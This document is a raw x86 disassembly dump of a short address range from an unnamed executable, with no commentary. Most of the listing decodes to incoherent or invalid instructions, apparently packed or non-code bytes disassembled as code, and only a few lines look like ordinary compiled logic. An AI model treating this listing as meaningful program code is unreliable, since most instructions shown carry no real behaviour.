  402893:	xor    ebp,ebx
  402895:	inc    ebp
  402896:	repz mov edx,0x3591e66e
  40289c:	mov    esp,0xc85c5d88
  4028a1:	sti    
  4028a2:	ja     0x4028d2
  4028a4:	daa    
  4028a5:	xor    ch,BYTE PTR [ebx-0x534d91b7]
  4028ab:	gs stos BYTE PTR es:[edi],al
  4028ad:	in     eax,0x51
  4028af:	push   es
  4028b0:	xchg   edx,eax
  4028b1:	dec    esi
  4028b2:	ins    DWORD PTR es:[edi],dx
  4028b3:	pop    edi
  4028b4:	aaa    
  4028b5:	mov    eax,ds:0xd0494c03
  4028ba:	ins    DWORD PTR es:[edi],dx
  4028bb:	out    0xf9,eax
  4028bd:	cmp    eax,0x192ad38
  4028c2:	(bad)  
  4028c3:	icebp  
  4028c4:	arpl   bx,ax
  4028c6:	xor    eax,DWORD PTR [eax-0x272ebe50]
  4028cc:	dec    esi
  4028cd:	pushf  
  4028ce:	mov    al,ds:0xe7b7eda3
  4028d3:	test   BYTE PTR [edx-0x2108558e],0x2d
  4028da:	jmp    0x402876
  4028dc:	mov    WORD PTR [eax+0x7e71366a],?
  4028e2:	(bad)  
  4028e3:	dec    ebp
  4028e4:	aaa    
  4028e5:	aas    
  4028e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e7:	add    eax,0x4499318a
  4028ec:	sub    eax,0xf10b56d7
  4028f1:	ins    BYTE PTR es:[edi],dx
  4028f2:	push   ecx
  4028f3:	mov    edi,0x140e9c8b
  4028f8:	mov    ch,0x7
  4028fa:	je     0x40291e
  4028fc:	add    bh,bl
  4028fe:	inc    ecx
  4028ff:	js     0x402934
  402901:	adc    al,0xd7
  402903:	cmp    cl,BYTE PTR [edx-0x5b]
  402906:	dec    esp
  402907:	pop    ds
  402908:	mov    al,0xd5
  40290a:	jmp    0xc821:0xfda62a9e
  402911:	js     0x4028f9
  402913:	out    0xde,al
  402915:	psrlq  mm5,mm5
  402918:	mov    eax,DWORD PTR [eax]
  40291a:	adc    eax,0x93aae33a
  40291f:	pop    ebp
  402920:	fs add dh,ch
  402923:	sub    al,0xfb
  402925:	jne    0x40293a
  402927:	pop    ds
  402928:	cld    
  402929:	setno  BYTE PTR [edi-0x2cb22f65]
  402930:	push   edx
  402931:	(bad)  
  402932:	(bad)  
  402933:	retf   0x29b6
  402936:	stos   DWORD PTR es:[edi],eax
  402937:	inc    esp
  402938:	scas   al,BYTE PTR es:[edi]
  402939:	inc    edx
  40293a:	retf   
  40293b:	jnp    0x402992
  40293d:	sub    dl,BYTE PTR [edx+0x40]
  402940:	or     ah,BYTE PTR [edi+0x1fd4e11e]
  402946:	pop    ebp
  402947:	or     al,0xdd
  402949:	mov    gs,WORD PTR [eax]
  40294b:	xlat   BYTE PTR ds:[ebx]
  40294c:	cmp    BYTE PTR [eax-0x22b7bd24],dh
  402952:	popf   
  402953:	adc    BYTE PTR [esi+0x65],al
  402956:	(bad)  
  402957:	jmp    0xcb:0x5b0bf7e5
  40295e:	scas   al,BYTE PTR es:[edi]
  40295f:	pop    eax
  402960:	or     eax,0xe2e75ed9
  402965:	leave  
  402966:	sbb    al,0xf6
  402968:	xor    esp,DWORD PTR [edi]
  40296a:	adc    DWORD PTR [esi+0x54],eax
  40296d:	jmp    0x4029bb
  40296f:	dec    edi
  402970:	ss pop edx
  402972:	or     eax,0xa9e37f9
  402977:	jno    0x4029d5
  402979:	or     al,0x42
  40297b:	mov    dl,0x3f
  40297d:	sub    cl,ah
  40297f:	xor    edx,DWORD PTR [ebp+0x60b16985]
  402985:	inc    edx
  402986:	xlat   BYTE PTR ds:[ebx]
  402987:	mov    dh,0x61
  402989:	xchg   edi,eax
  40298a:	shl    DWORD PTR [esi],cl
  40298c:	aaa    
  40298d:	add    eax,0x9afcb2c0
  402992:	shl    ch,1
  402994:	push   cs
  402995:	retf   0xe1e
  402998:	lea    eax,[eax]
  40299a:	xchg   ebp,eax
  40299b:	add    DWORD PTR [edx+0x7a],esp
  40299e:	in     eax,dx
  40299f:	pop    eax
  4029a0:	arpl   dx,di
  4029a2:	fsubr  DWORD PTR gs:[ebp+0x72]
  4029a6:	int    0xc4
  4029a8:	fisttp DWORD PTR [edi-0x67]
  4029ab:	retf   0x1a31
  4029ae:	addr16 call 0x48cd2ebb
  4029b4:	xchg   esi,eax
  4029b5:	xor    dl,al
  4029b7:	stos   BYTE PTR es:[edi],al
  4029b8:	xchg   esp,eax
  4029b9:	push   0x402ec513
  4029be:	mov    esp,0x9c21ca12
  4029c3:	hlt    
  4029c4:	in     eax,0xfd
  4029c6:	push   eax
  4029c7:	je     0x40294c
  4029c9:	xchg   esp,eax
  4029ca:	arpl   WORD PTR [eax],ax
  4029cc:	call   0x3e2df4d0
  4029d1:	xchg   esp,eax
  4029d2:	out    0x1c,al
  4029d4:	retf   
  4029d5:	fmul   DWORD PTR [edi+ebx*1-0x5c11d704]
  4029dc:	dec    ch
  4029de:	jg     0x402a18
  4029e0:	imul   ebx,DWORD PTR [edx+edx*4-0x555949ca],0x0
  4029e8:	lahf   
  4029e9:	dec    ebx
  4029ea:	out    0x14,al
  4029ec:	sub    edx,ebp
  4029ee:	xchg   edx,edx
  4029f0:	mov    cs,WORD PTR [esi+0x10b69700]
  4029f6:	pop    esp
  4029f7:	sahf   
  4029f8:	inc    esp
  4029f9:	lds    ebp,FWORD PTR [edi+0x4c]
  4029fc:	leave  
  4029fd:	pop    es
  4029fe:	add    DWORD PTR [esi+0x549c62ea],0x1b75da36
  402a08:	and    edx,ecx
  402a0a:	out    dx,al
  402a0b:	xchg   esp,eax
  402a0c:	mov    edx,0x9249632d
  402a11:	sbb    bh,dh
  402a13:	lea    ebx,[edi-0x5]
  402a16:	dec    edx
  402a17:	mov    esp,DWORD PTR [ecx+0x44]
  402a1a:	and    eax,0x17fe5ad6
  402a1f:	stc    
  402a20:	scas   eax,DWORD PTR es:[edi]
  402a21:	mov    esp,0x4ab7c489
  402a26:	rcr    BYTE PTR [esi],1
  402a28:	dec    edi
  402a29:	dec    esi
  402a2a:	jns    0x402a3a
  402a2c:	lods   eax,DWORD PTR ds:[esi]
  402a2d:	test   al,0x15
  402a2f:	xchg   edx,eax
  402a30:	pop    es
  402a31:	add    ecx,DWORD PTR [edx]
  402a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a34:	dec    eax
  402a35:	stc    
  402a36:	fisub  WORD PTR ds:0x2aa8aa9f
  402a3c:	psubusw mm6,QWORD PTR [edi-0x48]
  402a40:	in     al,0xc0
  402a42:	stc    
  402a43:	jecxz  0x402a48
  402a45:	fsubp  st(0),st
  402a47:	mov    edi,0xaf83821b
  402a4c:	mov    ah,0xcd
  402a4e:	cmp    bl,BYTE PTR es:[esi]
  402a51:	xchg   ecx,eax
  402a52:	nop
  402a53:	adc    eax,DWORD PTR [ecx+0x6d]
  402a56:	push   edi
  402a57:	push   es
  402a58:	or     al,0xbd
  402a5a:	xor    al,0x7a
  402a5c:	into   
  402a5d:	mov    esp,ebp
  402a5f:	cdq    
  402a60:	pop    ebx
  402a61:	jmp    0x402a60
  402a63:	xchg   ebx,eax
  402a64:	call   0x2c9d:0xdc839f95
  402a6b:	rcr    DWORD PTR [ecx],1
  402a6d:	jl     0x402acb
  402a6f:	push   ebp
  402a70:	mov    dh,0x80
  402a72:	xor    eax,0x29fe8b74
  402a77:	mov    dh,0xb8
  402a79:	arpl   WORD PTR [edx],ax
  402a7b:	in     al,0xaf
  402a7d:	mov    ah,0x48
  402a7f:	ss sub al,0x94
  402a82:	jno    0x402a50
  402a84:	(bad)  
  402a86:	xor    esi,DWORD PTR [ecx+0x7af8e879]
  402a8c:	jmp    0x402a42
  402a8e:	push   es
  402a8f:	addr16 (bad) 
  402a92:	push   ss
  402a93:	pusha  
  402a94:	scas   eax,DWORD PTR es:[edi]
  402a95:	and    al,0x75
  402a97:	pop    ecx
  402a98:	in     eax,0x3a
  402a9a:	out    dx,eax
  402a9b:	mov    ch,0xeb
  402a9d:	ins    DWORD PTR es:[edi],dx
  402a9e:	xor    ah,BYTE PTR [ecx+0x3d]
  402aa1:	xchg   dh,dl
  402aa3:	scas   eax,DWORD PTR es:[edi]
  402aa4:	clc    
  402aa5:	push   es
  402aa6:	mov    bh,0xd8
  402aa8:	lods   al,BYTE PTR ds:[esi]
  402aa9:	retf   
  402aaa:	sub    BYTE PTR [eax+eax*2+0x4e597fc2],ah
  402ab1:	dec    ebp
  402ab2:	repnz rcl BYTE PTR [edi],0xba
  402ab6:	push   es
  402ab7:	and    al,0xe8
  402ab9:	add    eax,0xb3fb4928
  402abe:	jb     0x402a46
  402ac0:	and    edx,DWORD PTR ds:0x1eb547b
  402ac6:	jnp    0x402b41
  402ac8:	repnz cmp eax,0x9875efa
  402ace:	add    eax,0xea23d292
  402ad3:	pop    esi
  402ad4:	push   0x70
  402ad6:	jl     0x402ae5
  402ad8:	gs xor al,0xc0
  402adb:	rcr    DWORD PTR [ecx],0x2b
  402ade:	ficom  DWORD PTR [eax+edx*2+0x31d6ce09]
  402ae5:	xor    eax,0x66a82796
  402aea:	pop    ecx
  402aeb:	cmp    dl,0x46
  402aee:	sub    ch,BYTE PTR [ecx]
  402af0:	das    
  402af1:	stc    
  402af2:	sub    eax,0x70948ca3
  402af7:	inc    edx
  402af8:	test   ah,bl
  402afa:	inc    esp
  402afb:	int    0x77
  402afd:	mov    bh,BYTE PTR [eax-0x2d]
  402b00:	rcr    BYTE PTR [esi-0x1f],0x21
  402b04:	sbb    al,0x66
  402b06:	pop    ecx
  402b07:	sar    BYTE PTR [edi],0xaa
  402b0a:	retf   0x9275
  402b0d:	jnp    0x402ac8
  402b0f:	sub    ecx,eax
  402b11:	jmp    0x402db0
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	rcl    DWORD PTR [edi+0x78],cl
  402b25:	icebp  
  402b26:	mov    ss,WORD PTR [edx]
  402b28:	js     0x402ba2
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402af3
  402b2f:	mov    ch,0x66
  402b31:	in     eax,dx
  402b32:	jnp    0x402b28
  402b34:	or     DWORD PTR [edi],0xbff24820
  402b3a:	pop    eax
  402b3b:	pop    ds
  402b3c:	xor    BYTE PTR [ebp+0x79925dc],cl
  402b42:	stos   DWORD PTR es:[edi],eax
  402b43:	mov    ds,WORD PTR [edx-0x58f4f3a0]
  402b49:	jl     0x402b2e
  402b4b:	or     ebp,DWORD PTR [ecx-0x9]
  402b4e:	xor    BYTE PTR [ecx+0x66bec0],dh
  402b54:	and    al,0x6d
  402b56:	pop    esi
  402b57:	es push esp
  402b59:	jmp    0x402bb8
  402b5b:	mov    ebp,0xfb7468d4
  402b60:	jmp    0x3104e24e
  402b65:	ds pop ebx
  402b67:	popf   
  402b68:	jno    0x402bd1
  402b6a:	sbb    eax,0x710cbe06
  402b6f:	mov    gs,WORD PTR [edx]
  402b71:	sub    eax,esp
  402b73:	dec    ecx
  402b74:	push   cs
  402b75:	inc    edx
  402b76:	enter  0x2b8e,0x9c
  402b7a:	push   ecx
  402b7b:	sbb    eax,0xe010a14f
  402b80:	mov    ds:0x7295bff7,al
  402b85:	scas   al,BYTE PTR es:[edi]
  402b86:	aas    
  402b87:	loopne 0x402b1d
  402b89:	mov    ah,0x1b
  402b8b:	push   esi
  402b8c:	inc    edx
  402b8d:	xchg   edx,eax
  402b8e:	ficom  WORD PTR [ecx+0x5ee79b5b]
  402b94:	popf   
  402b95:	xlat   BYTE PTR ds:[ebx]
  402b96:	jmp    0xbca4:0x43bb6b20
  402b9d:	push   0x5
  402b9f:	in     eax,dx
  402ba0:	xchg   DWORD PTR ds:0x7a644719,ebx
  402ba6:	pop    ebx
  402ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba8:	inc    esi
  402ba9:	aad    0x18
  402bab:	pop    edx
  402bac:	cmp    cl,BYTE PTR [ebx]
  402bae:	hlt    
  402baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb0:	jge    0x402b60
  402bb2:	xchg   esp,eax
  402bb3:	mov    edx,0x440bb448
  402bb8:	cmp    ch,ch
  402bba:	call   0x4be0:0x5cbc9765
  402bc1:	mov    esp,0xfe186fc2
  402bc6:	je     0x402c16
  402bc8:	inc    edx
  402bc9:	lds    esp,FWORD PTR [eax+0x4b81ffa5]
  402bcf:	sub    DWORD PTR [edi+eiz*2],ebx
  402bd2:	fstp   TBYTE PTR [edi+0x41359202]
  402bd8:	das    
  402bd9:	add    esi,DWORD PTR [ebx]
  402bdb:	adc    eax,0x89bb5300
  402be0:	sar    BYTE PTR [ebx-0x1614cbc9],cl
  402be6:	out    0x23,al
  402be8:	loope  0x402bc6
  402bea:	jmp    0x402c25
  402bec:	aaa    
  402bed:	mov    al,0x6
  402bef:	dec    ebp
  402bf0:	sbb    al,0x2c
  402bf2:	inc    ebp
  402bf3:	adc    BYTE PTR [ebx],ah
  402bf5:	mul    DWORD PTR [eax+0x7a470f94]
  402bfb:	in     al,dx
  402bfc:	addr16 bnd jg 0x402c43
  402c00:	sti    
  402c01:	xchg   edi,eax
  402c02:	ss aaa 
  402c04:	mov    WORD PTR ds:0x3b69b4a3,?
  402c0a:	fwait
  402c0b:	mov    edx,0xc3d73cac
  402c10:	faddp  st(3),st
  402c12:	sbb    dl,BYTE PTR [ecx]
  402c14:	(bad)  
  402c15:	mov    edx,0xece94530
  402c1a:	inc    ecx
  402c1b:	dec    esi
  402c1c:	fcom   DWORD PTR [eax-0x5d]
  402c1f:	xchg   esp,eax
  402c20:	sbb    al,0x34
  402c22:	xor    eax,DWORD PTR [esi+0x1b]
  402c25:	adc    edx,DWORD PTR [ebx+0x48fd4fa6]
  402c2b:	sti    
  402c2c:	mov    ebp,DWORD PTR [eax+0x77db4121]
  402c32:	pop    es
  402c33:	retf   0x6848
  402c36:	pop    eax
  402c37:	sbb    esi,DWORD PTR [edi]
  402c39:	popa   
  402c3a:	jb     0x402bc6
  402c3c:	jb     0x402bf6
  402c3e:	sub    eax,0xb62b9997
  402c43:	fs inc esi
  402c45:	xchg   esi,eax
  402c46:	mov    cl,0xbd
  402c48:	je     0x402c9d
  402c4a:	inc    ecx
  402c4b:	out    0x8a,al
  402c4d:	aaa    
  402c4e:	fld    TBYTE PTR [esi-0x1e5b00e4]
  402c54:	test   eax,0x7065ca23
  402c59:	mov    eax,ds:0x6eca78ce
  402c5e:	int3   
  402c5f:	enter  0xf3ac,0x46
  402c63:	mov    al,ds:0x40d7df09
  402c68:	push   ecx
  402c69:	sahf   
  402c6a:	cmp    eax,0x7f672da9
  402c6f:	(bad)
  402c73:	je     0x402c16
  402c75:	inc    edi
  402c76:	push   edx
  402c77:	adc    al,0x5d
  402c79:	cwde   
  402c7a:	mov    eax,ds:0x878812b1
  402c7f:	js     0x402c28
  402c81:	jg     0x402c36
  402c83:	ins    DWORD PTR es:[edi],dx
  402c84:	cs je  0x402c10
  402c87:	cmp    BYTE PTR [edi+0x12],0x9e
  402c8b:	bound  edi,QWORD PTR [edx+ebx*1+0x4]
  402c8f:	bswap  esp
  402c91:	retf   0x9d79
  402c94:	in     al,dx
  402c95:	jnp    0x402c9a
  402c97:	fcomp  QWORD PTR [eax]
  402c99:	and    al,BYTE PTR [edi-0x23cfcbca]
  402c9f:	cmc    
  402ca0:	mov    es,WORD PTR es:[ebx+edi*8]
  402ca4:	aaa    
  402ca5:	fcmovb st,st(1)
  402ca7:	sbb    BYTE PTR [ebp+0x40],bh
  402caa:	ret    
  402cab:	adc    BYTE PTR [ebp-0x3d3e2b73],ch
  402cb1:	ret    0x7ccc
  402cb4:	popf   
  402cb5:	jle    0x402d05
  402cb7:	push   ebx
  402cb8:	mov    esi,0x8734b0ee
  402cbd:	cmc    
  402cbe:	jg     0x402c6f
  402cc0:	push   cs
  402cc1:	fcomp  QWORD PTR [edi+ebx*1-0x28]
  402cc5:	dec    ebp
  402cc6:	sub    al,0x24
  402cc8:	popf   
  402cc9:	mov    eax,0xbb74af8c
  402cce:	adc    al,0x72
  402cd0:	and    eax,0xb08c71ea
  402cd5:	aam    0x61
  402cd7:	retf   0x528c
  402cda:	mov    bh,0xb3
  402cdc:	add    eax,0x9bc3e84c
  402ce1:	push   ecx
  402ce2:	imul   ebp,DWORD PTR [eax+0xadb03e8],0xf
  402ce9:	push   edx
  402cea:	mov    ebp,0xff82c637
  402cef:	sar    si,1
  402cf2:	es ins BYTE PTR es:[edi],dx
  402cf4:	stos   DWORD PTR es:[edi],eax
  402cf5:	and    DWORD PTR [eax],ebp
  402cf7:	mov    esp,0x2f266972
  402cfc:	outs   dx,BYTE PTR ds:[esi]
  402cfd:	push   cs
  402cfe:	mov    es,WORD PTR [eax+0x35fdb154]
  402d04:	jp     0x402d7a
  402d06:	in     al,0x1c
  402d08:	pushf  
  402d09:	lods   eax,DWORD PTR ds:[esi]
  402d0a:	mov    cl,0x4c
  402d0c:	loop   0x402ccb
  402d0e:	mov    WORD PTR [ebx-0x53],cs
  402d11:	fcom   DWORD PTR [edx-0x48d310d2]
  402d17:	jne    0x402cc8
  402d19:	dec    BYTE PTR [eax+0x450c7b3f]
  402d1f:	mov    ch,0x7
  402d21:	inc    edx
  402d22:	pop    esp
  402d23:	pusha  
  402d24:	loop   0x402da2
  402d26:	cli    
  402d27:	jl     0x402d9d
  402d29:	int3   
  402d2a:	into   
  402d2b:	leave  
  402d2c:	popa   
  402d2d:	pop    ds
  402d2e:	inc    ebp
  402d2f:	jecxz  0x402cb8
  402d31:	pop    ecx
  402d32:	mov    esp,0xf0d931ba
  402d37:	push   ss
  402d38:	push   eax
  402d39:	loopne 0x402d75
  402d3b:	enter  0x2336,0xeb
  402d3f:	retf   0x70fd
  402d42:	(bad)  
  402d43:	pop    edx
  402d44:	clc    
  402d45:	ror    DWORD PTR [edi-0x4ee21c8d],cl
  402d4b:	and    eax,0x3b8b55b3
  402d50:	pop    eax
  402d51:	(bad)  
  402d52:	and    DWORD PTR [eax],ebx
  402d54:	xor    al,0xbd
  402d56:	pushf  
  402d57:	jle    0x402d2a
  402d59:	hlt    
  402d5a:	jo     0x402dc3
  402d5c:	mov    edx,0x950200b4
  402d61:	inc    ebx
  402d62:	inc    esp
  402d63:	add    ecx,DWORD PTR [edx-0x35]
  402d66:	dec    esi
  402d67:	ffreep st(0)
  402d69:	retf   0xf81d
  402d6c:	dec    ebp
  402d6d:	jno    0x402dc7
  402d6f:	dec    esp
  402d70:	jg     0x402d94
  402d72:	and    ebx,DWORD PTR [edx+0x4a162785]
  402d78:	bound  ecx,QWORD PTR [esi]
  402d7a:	(bad)  
  402d7b:	jns    0x402d51
  402d7d:	mov    ?,WORD PTR [edx+ebp*1]
  402d80:	dec    ecx
  402d81:	pop    ecx
  402d82:	xchg   ebp,eax
  402d83:	popf   
  402d84:	and    eax,esp
  402d86:	mov    eax,0x9c67cb34
  402d8b:	push   ds
  402d8c:	test   BYTE PTR [eax-0x5175cb6d],ah
  402d92:	ins    DWORD PTR es:[edi],dx
  402d93:	dec    ebp
  402d94:	or     edx,ecx
  402d96:	bound  ecx,QWORD PTR [esi+0x545a8909]
  402d9c:	xchg   DWORD PTR [edx],esi
  402d9e:	push   edi
  402d9f:	xlat   BYTE PTR ds:[ebx]
  402da0:	cmp    ebp,esi
  402da2:	dec    edi
  402da3:	scas   eax,DWORD PTR es:[edi]
  402da4:	call   0xac7:0xbff17a8
  402dab:	push   ss
  402dac:	mov    ch,0xab
  402dae:	mov    ch,0x59
  402db0:	sub    ecx,edi
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	cmp    esi,DWORD PTR ds:0x170c5cdc
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e58
  402dff:	and    esp,DWORD PTR [ebx-0xaf1fee6]
  402e05:	inc    esi
  402e06:	push   cs
  402e07:	dec    ebp
  402e08:	dec    eax
  402e09:	out    dx,eax
  402e0a:	ror    bl,0x5a
  402e0d:	mov    bl,0xd0
  402e0f:	pop    edi
  402e10:	mov    bh,0xb9
  402e12:	jmp    0xe983:0xcc77a58c
  402e19:	stc    
  402e1a:	xchg   ebp,eax
  402e1b:	arpl   si,di
  402e1d:	jg     0x402dbe
  402e1f:	dec    ebp
  402e20:	mov    ?,WORD PTR [edi+0x26491b72]
  402e26:	and    BYTE PTR [eax+0x6cd6a33b],al
  402e2c:	pushf  
  402e2d:	dec    ecx
  402e2e:	ffreep st(0)
  402e30:	xor    DWORD PTR [eax-0x50],0x73e39c46
  402e37:	add    al,0x40
  402e39:	pop    ss
  402e3a:	inc    esp
  402e3b:	dec    ecx
  402e3c:	inc    esi
  402e3d:	ja     0x402dc4
  402e3f:	mov    BYTE PTR ds:0xdfc2ffe7,bl
  402e45:	mov    BYTE PTR [ecx+0x40],dl
  402e48:	inc    ebx
  402e49:	jno    0x402e36
  402e4b:	jo     0x402e00
  402e4d:	out    0xc1,al
  402e4f:	(bad)  
  402e50:	cmp    cl,BYTE PTR [ebp+0x66b84dd8]
  402e56:	jg     0x402ecd
  402e58:	jge    0x402e5d
  402e5a:	dec    edi
  402e5b:	inc    esi
  402e5c:	ror    DWORD PTR [ecx],cl
  402e5e:	jl     0x402e85
  402e60:	in     eax,dx
  402e61:	pusha  
  402e62:	aaa    
  402e63:	(bad)
  402e67:	jmp    0x8eb356c1
  402e6c:	add    bl,ah
  402e6e:	lods   al,BYTE PTR ds:[esi]
  402e6f:	ror    DWORD PTR [ebp-0x3e],0x94
  402e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e74:	and    BYTE PTR [esi],bh
  402e76:	push   edi
  402e77:	std    
  402e78:	jno    0x402e7c
  402e7a:	fild   DWORD PTR [edi+esi*8+0x69]
  402e7e:	fwait
  402e7f:	push   0x27ff71b9
  402e84:	mov    esi,0x82fa6410
  402e89:	dec    ebp
  402e8a:	data16 xor BYTE PTR [ebx+0x4c],dl
  402e8e:	ds test eax,0xb52201ff
  402e94:	xchg   BYTE PTR ds:[esi],bh
  402e97:	mov    esi,0x83ef72d5
  402e9c:	loop   0x402e3c
  402e9e:	jecxz  0x402eeb
  402ea0:	cmp    BYTE PTR [edi],bl
  402ea2:	mov    ah,0xb7
  402ea4:	jns    0x402ea5
  402ea6:	push   edx
  402ea7:	fs jnp 0x402e92
  402eaa:	pop    edi
  402eab:	inc    ebx
  402eac:	cdq    
  402ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eae:	pop    es
  402eaf:	movzx  ecx,cx
  402eb2:	bound  esp,QWORD PTR [ecx+0x4f]
  402eb5:	jns    0x402ea2
  402eb7:	ret    
  402eb8:	cld    
  402eb9:	pop    edx
  402eba:	dec    ebx
  402ebb:	ret    0x84d
  402ebe:	add    DWORD PTR ds:0xb927b47b,0xbd94add2
  402ec8:	enter  0x1b22,0x9b
  402ecc:	pop    ds
  402ecd:	dec    edi
  402ece:	js     0x402f31
  402ed0:	stc    
  402ed1:	cmp    edx,DWORD PTR [ecx]
  402ed3:	stos   DWORD PTR es:[edi],eax
  402ed4:	dec    ebx
  402ed5:	sub    BYTE PTR [ebx*4-0x12ad7c8e],cl
  402edc:	ja     0x402f06
  402ede:	ja     0x402e7e
  402ee0:	test   eax,0xd16fcf97
  402ee5:	mov    ebx,esp
  402ee7:	and    al,BYTE PTR ds:0xe4497e72
  402eed:	sub    al,al
  402eef:	test   BYTE PTR [eax-0x70],bh
  402ef2:	push   0xcef69c4c
  402ef7:	push   ebx
  402ef8:	scas   eax,DWORD PTR es:[edi]
  402ef9:	mov    ebp,0x2cdd367e
  402efe:	inc    ebx
  402eff:	push   edi
  402f00:	in     eax,dx
  402f01:	and    DWORD PTR [ecx],0x67
  402f04:	dec    esp
  402f05:	add    eax,0x4c76142
  402f0a:	add    DWORD PTR [ecx],ebx
  402f0c:	call   0x1eb6:0x8e1e9887
  402f13:	and    BYTE PTR [esi-0x15766b02],bh
  402f19:	pusha  
  402f1a:	mov    dl,0x21
  402f1c:	cli    
  402f1d:	push   ebx
  402f1e:	scas   al,BYTE PTR es:[edi]
  402f1f:	pop    edx
  402f20:	pop    ebp
  402f21:	mov    edi,0x41b3c2b7
  402f26:	fiadd  WORD PTR [edx-0x648c9086]
  402f2c:	xchg   esp,eax
  402f2d:	or     DWORD PTR [ebp-0x18c32fef],ebp
  402f33:	xchg   edi,eax
  402f34:	fsub   QWORD PTR [ebp-0x5ac3ec8c]
  402f3a:	je     0x402fa8
  402f3c:	and    ebp,DWORD PTR [ebx-0x55be0611]
  402f42:	rcl    DWORD PTR [ebx-0x56b283e],1
  402f48:	test   al,0x24
  402f4a:	add    esp,edx
  402f4c:	push   DWORD PTR [edi+0x1e04cd4e]
  402f52:	mov    edx,DWORD PTR [ecx+0x15]
  402f55:	neg    al
  402f57:	jge    0x402ee6
  402f59:	aad    0x42
  402f5b:	inc    ecx
  402f5c:	arpl   WORD PTR [edi+0x25],ax
  402f5f:	jns    0x402f14
  402f61:	daa    
  402f62:	cs out 0x5a,al
  402f65:	pop    eax
  402f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f67:	mov    ah,0x7a
  402f69:	out    dx,eax
  402f6a:	jl     0x402f1d
  402f6c:	fidiv  DWORD PTR [edi-0x6b]
  402f6f:	or     al,0xe7
  402f71:	push   cs
  402f72:	std    
  402f73:	pop    es
  402f74:	shr    BYTE PTR [edi+0x29],cl
  402f77:	sbb    BYTE PTR [edx],0xa9
  402f7a:	repz enter 0x8ebf,0x3d
  402f7f:	and    eax,0x93aa74ff
  402f84:	and    dl,BYTE PTR [esi+ebp*2]
  402f87:	push   ss
  402f88:	imul   eax,DWORD PTR [ebx-0x6fc7f12c],0x1b
  402f8f:	jnp    0x402fe8
  402f91:	test   DWORD PTR [edi-0x67],edx
  402f94:	test   BYTE PTR [eax-0x16e495a5],cl
  402f9a:	dec    edx
  402f9b:	(bad)  
  402f9c:	jo     0x402fb4
  402f9e:	loop   0x402fdb
  402fa0:	out    dx,al
  402fa1:	sub    dl,dl
  402fa3:	call   0x7b1d:0xd5e096b3
  402faa:	mov    edx,0x8228f3d8
  402faf:	(bad)  
  402fb1:	sbb    al,0x26
  402fb3:	test   al,0x41
  402fb5:	in     al,0x21
  402fb7:	fcom   DWORD PTR [ebp+0x2a]
  402fba:	sub    DWORD PTR [edx+0x75],edx
  402fbd:	pusha  
  402fbe:	(bad)  
  402fbf:	bound  ebx,QWORD PTR [eax]
  402fc1:	loop   0x402f4b
  402fc3:	sar    BYTE PTR [esi],0xc4
  402fc6:	dec    edx
  402fc7:	adc    DWORD PTR [edx],edi
  402fc9:	(bad)  
  402fca:	push   ss
  402fcb:	push   ecx
  402fcc:	stos   BYTE PTR es:[edi],al
  402fcd:	aaa    
  402fce:	test   DWORD PTR [ebx],ecx
  402fd0:	xchg   edi,eax
  402fd1:	(bad)  
  402fd2:	stos   BYTE PTR es:[edi],al
  402fd3:	inc    esp
  402fd4:	mov    edx,0xad893df0
  402fd9:	int    0x7b
  402fdb:	mov    edx,esp
  402fdd:	aas    
  402fde:	add    al,0x4e
  402fe0:	xchg   edi,edi
  402fe2:	pusha  
  402fe3:	out    0x3d,eax
  402fe5:	inc    esp
  402fe6:	xchg   BYTE PTR [ecx],dh
  402fe8:	test   DWORD PTR [edi-0x4aae1dab],esp
  402fee:	(bad)  
  402fef:	pop    ebx
  402ff0:	and    eax,0x64068f0a
  402ff5:	pop    ds
  402ff6:	into   
  402ff7:	cwde   
  402ff8:	add    DWORD PTR [ebx-0x5a],ecx
  402ffb:	mov    ds:0x78e3378b,al
  403000:	and    BYTE PTR [edi-0x65],bh
  403003:	mov    ebp,0xfb0b019e
  403008:	neg    bl
  40300a:	mov    bl,0x44
  40300c:	addr16 (bad) 
  40300e:	mov    ebp,0x8509b5e8
  403013:	ficom  DWORD PTR [edi-0x42]
  403016:	adc    eax,0xffffff82
  403019:	sbb    eax,esp
  40301b:	and    ecx,DWORD PTR [edx]
  40301d:	mov    eax,ds:0xb7f527b8
  403022:	pop    eax
  403023:	sub    ch,dh
  403025:	aad    0x15
  403027:	sub    DWORD PTR [ebp+0x2d],ebx
  40302a:	imul   edi,DWORD PTR [eax+0x5a842a91],0x624c7d7f
  403034:	call   0x9c2e:0xbcf5e772
  40303b:	jmp    0x16f5b8a8
  403040:	and    DWORD PTR [esp+edx*4+0x21],edi
  403044:	add    eax,0x7462fa38
  403049:	sbb    ch,bl
  40304b:	or     bh,BYTE PTR [edx]
  40304d:	je     0x403079
  40304f:	jle    0x40303e
  403051:	mov    ds:0xbfbcc3c2,eax
  403056:	lea    esi,[ebx]
  403058:	dec    ebp
  403059:	mov    esp,0x39e609a1
  40305e:	add    dl,BYTE PTR [esp+esi*1]
  403061:	dec    edx
  403062:	lea    ebx,[edi-0x8]
  403065:	das    
